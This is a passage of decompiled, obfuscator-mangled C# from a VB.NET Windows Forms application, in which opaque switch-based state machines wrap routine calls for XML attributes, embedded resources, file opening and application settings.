      }
label_8:
      return obj0.FirstAttribute;
    }

    [SecuritySafeCritical]
    internal static XAttribute ႣႭ([In] XAttribute obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 119:
          num1 = 4;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_3;
          case 2:
          case 3:
            num2 = 0;
            continue;
          case 4:
            goto label_8;
          case 6:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႣႭ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.NextAttribute;
    }

    [SecuritySafeCritical]
    internal static void ႣႣ([In] XAttribute obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 1:
          case 4:
          case 5:
            goto label_7;
          case 2:
            num1 = 3;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 85:
                num2 = 4;
                break;
              default:
                num2 = 2;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Remove();
    }

    [SecuritySafeCritical]
    internal static AppDomain ႣႰ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 83:
          num1 = 7;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
          case 7:
            goto label_8;
          case 1:
            goto label_3;
          case 3:
            num2 = 1;
            continue;
          case 6:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႣႰ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return AppDomain.CurrentDomain;
    }

    [SecuritySafeCritical]
    internal static object ႣႳ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 44:
          num1 = 7;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 4:
          case 5:
          case 7:
            goto label_8;
          case 6:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႣႳ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0.GetData(obj1);
    }

    [SecuritySafeCritical]
    internal static Stream ႣႤ([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 102:
          num1 = 4;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            num2 = 3;
            continue;
          case 1:
          case 2:
          case 6:
            num2 = 3;
            continue;
          case 3:
            goto label_3;
          case 4:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႣႤ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return obj0.GetManifestResourceStream(obj1);
    }

    [SecuritySafeCritical]
    internal static string ႣႷ([In] string obj0, [In] string[] obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 29:
          num1 = 2;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 6:
            num2 = 7;
            continue;
          case 2:
            goto label_8;
          case 3:
          case 5:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႣႷ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Utils.GetResourceString(obj0, obj1);
    }

    [SecuritySafeCritical]
    internal static void ႣႠ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            num1 = 1;
            continue;
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 22:
                num2 = 4;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      ProjectData.SetProjectError(obj0);
    }

    [SecuritySafeCritical]
    internal static void ႣႼ()
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
          case 3:
            goto label_4;
          default:
            if (!Ⴈ.Ⴓ.ႣႨ)
            {
              num1 = 0;
              continue;
            }
            goto label_11;
        }
      }
label_11:
      return;
label_4:
      lock (typeof (Ⴈ.Ⴓ))
      {
        int num2 = 2;
        while (true)
        {
          switch (num2)
          {
            case 0:
              Ⴈ.Ⴓ.ႣႨ = true;
              goto case 5;
            case 1:
            case 3:
              goto label_13;
            case 4:
              num2 = 1;
              continue;
            case 5:
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Ⴈ.Ⴓ.ႰႥ);
              goto case 4;
            default:
              num2 = Ⴈ.Ⴓ.ႣႨ ? 1 : 0;
              continue;
          }
        }
      }
label_13:
      int num3 = 2;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 1:
          case 3:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႣႼ);
            num3 = 4;
            continue;
          case 4:
            goto label_17;
          default:
            num3 = 4;
            continue;
        }
      }
label_17:;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    private sealed class Ⴐ
    {
      private Ⴈ.Ⴓ.ႭႨ Ⴐ;

      [EditorBrowsable(EditorBrowsableState.Never)]
      internal Ⴐ(string[] Ⴐ, XNamespace[] Ⴀ, List<XAttribute> Ⴄ)
      {
        this.Ⴐ.Ⴐ = Ⴐ;
        this.Ⴐ.Ⴀ = Ⴀ;
        this.Ⴐ.Ⴃ = Ⴄ;
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      internal XElement Ⴅ(XElement Ⴈ)
      {
label_3:
        XElement xelement = Ⴈ.Ⴓ.Ⴄ(this.Ⴐ.Ⴐ, this.Ⴐ.Ⴀ, this.Ⴐ.Ⴃ, Ⴈ);
        int num = 3;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 4:
            case 5:
              goto label_3;
            case 2:
            case 3:
              goto label_4;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴐ.Ⴅ);
              num = 4;
              continue;
          }
        }
label_4:
        return xelement;
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      internal object Ⴓ(object Ⴈ)
      {
label_3:
        XElement Ⴀ = Ⴈ as XElement;
        bool flag = Ⴀ != null;
        int num = 3;
        object obj;
        while (true)
        {
          switch (num)
          {
            case 0:
              obj = (object) Ⴈ.Ⴓ.Ⴄ(this.Ⴐ.Ⴐ, this.Ⴐ.Ⴀ, this.Ⴐ.Ⴃ, Ⴀ);
              goto case 8;
            case 1:
              num = 7;
              continue;
            case 3:
              num = !flag ? 5 : 0;
              continue;
            case 5:
              obj = Ⴈ;
              num = 7;
              continue;
            case 6:
            case 10:
              goto label_3;
            case 7:
              goto label_10;
            case 8:
              num = 7;
              continue;
            case 9:
              num = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴐ.Ⴓ);
              num = 6;
              continue;
          }
        }
label_10:
        return obj;
      }

      [SecuritySafeCritical]
      static Ⴐ() => Ⴈ.Ⴓ.ႣႼ();
    }

    internal sealed class Ⴍ
    {
      [SecuritySafeCritical]
      internal static bool Ⴈ([In] WindowsFormsApplicationBase obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 15:
            num1 = 7;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              num2 = 2;
              continue;
            case 1:
            case 7:
              goto label_8;
            case 2:
            case 6:
              goto label_3;
            case 4:
              num2 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴍ.Ⴈ);
              num2 = 2;
              continue;
          }
        }
label_8:
        return obj0.SaveMySettingsOnExit;
      }

      [SecuritySafeCritical]
      internal static void Ⴄ([In] object obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 3:
            case 5:
              goto label_7;
            case 4:
              num1 = 2;
              continue;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 94:
                  num2 = 3;
                  break;
                case 95:
                  goto label_8;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        ObjectFlowControl.CheckForSyncLockOnValueType(obj0);
        return;
label_8:
        Monitor.Exit(obj0);
      }

      [SecuritySafeCritical]
      internal static bool Ⴍ([In] WeakReference obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 52:
            num1 = 2;
            break;
          default:
            num1 = 5;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_3;
            case 1:
            case 7:
              num2 = 4;
              continue;
            case 2:
              goto label_8;
            case 3:
            case 5:
              num2 = 4;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴍ.Ⴍ);
              num2 = 4;
              continue;
          }
        }
label_8:
        return obj0.IsAlive;
      }

      [SecuritySafeCritical]
      internal static void Ⴅ([In] Control obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 2:
              num1 = 0;
              continue;
            case 3:
              goto label_8;
            case 4:
            case 5:
              goto label_7;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 16:
                  num2 = 5;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.SuspendLayout();
      }

      [SecuritySafeCritical]
      internal static void Ⴓ([In] ContainerControl obj0, [In] SizeF obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 3:
              goto label_7;
            case 4:
            case 5:
              num1 = 2;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 74:
                  num2 = 1;
                  break;
                default:
                  num2 = 5;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.AutoScaleDimensions = obj1;
      }

      [SecuritySafeCritical]
      internal static void Ⴃ([In] int obj0, [In] int obj1)
      {
        int num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 2:
              num1 = 1;
              continue;
            case 3:
            case 4:
              goto label_7;
            case 5:
              goto label_8;
            default:
              int num2;
              switch (obj1 ^ obj0)
              {
                case 85:
                  num2 = 3;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        ProjectData.ClearProjectError();
      }

      [SecuritySafeCritical]
      internal static void Ⴀ(
        [In] int obj0,
        [In] string obj1,
        [In] OpenMode obj2,
        [In] OpenAccess obj3,
        [In] OpenShare obj4,
        [In] int obj5,
        [In] int obj6,
        [In] int obj7)
      {
        int num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
            case 5:
              goto label_7;
            case 2:
            case 4:
              num1 = 1;
              continue;
            default:
              int num2;
              switch (obj7 ^ obj6)
              {
                case 47:
                  num2 = 3;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        FileSystem.FileOpen(obj0, obj1, obj2, obj3, obj4, obj5);
      }

      [SecuritySafeCritical]
      internal static string[] Ⴗ(
        [In] string obj0,
        [In] string obj1,
        [In] int obj2,
        [In] CompareMethod obj3,
        [In] int obj4,
        [In] int obj5)
      {
label_3:
        int num1;
        switch (obj5 ^ obj4)
        {
          case 86:
            num1 = 6;
            break;
          default:
            num1 = 3;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_3;
            case 1:
            case 2:
            case 6:
              goto label_8;
            case 3:
              num2 = 0;
              continue;
            case 4:
              num2 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴍ.Ⴗ);
              num2 = 0;
              continue;
          }
        }
label_8:
        return Microsoft.VisualBasic.Strings.Split(obj0, obj1, obj2, obj3);
      }

      [SecuritySafeCritical]
      internal static XName Ⴐ([In] XAttribute obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 76:
            num1 = 3;
            break;
          default:
            num1 = 5;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 7:
              num2 = 2;
              continue;
            case 2:
            case 4:
            case 6:
              goto label_3;
            case 3:
              goto label_8;
            case 5:
              num2 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴍ.Ⴐ);
              num2 = 2;
              continue;
          }
        }
label_8:
        return obj0.Name;
      }

      [SecuritySafeCritical]
      internal static string Ⴜ([In] XName obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 71:
            num1 = 6;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
            case 6:
            case 7:
              goto label_8;
            case 1:
              num2 = 5;
              continue;
            case 4:
              num2 = 5;
              continue;
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴍ.Ⴜ);
              num2 = 5;
              continue;
          }
        }
label_8:
        return obj0.LocalName;
      }

      [SecuritySafeCritical]
      internal static bool ႤႨ([In] XNamespace obj0, [In] XNamespace obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 102:
            num1 = 3;
            break;
          default:
            num1 = 6;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              num2 = 2;
              continue;
            case 1:
            case 2:
              goto label_3;
            case 3:
            case 5:
              goto label_8;
            case 6:
              num2 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴍ.ႤႨ);
              num2 = 2;
              continue;
          }
        }
label_8:
        return obj0 == obj1;
      }

      [SecuritySafeCritical]
      internal static Exception ႤႤ([In] Exception obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 91:
            num1 = 3;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 7:
              goto label_3;
            case 2:
              num2 = 1;
              continue;
            case 3:
              goto label_8;
            case 4:
            case 5:
              num2 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴍ.ႤႤ);
              num2 = 1;
              continue;
          }
        }
label_8:
        return obj0.InnerException;
      }

      [SecuritySafeCritical]
      internal static void ႤႭ([In] WindowsFormsApplicationBase obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_8;
            case 1:
              num1 = 5;
              continue;
            case 2:
            case 4:
              goto label_7;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 84:
                  num2 = 4;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.SaveMySettingsOnExit = obj1;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 420, Pack = 1)]
    private struct ႭႰ
    {
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct ႭႨ
    {
      internal string[] Ⴐ;
      internal XNamespace[] Ⴀ;
      internal List<XAttribute> Ⴃ;
    }
  }
}
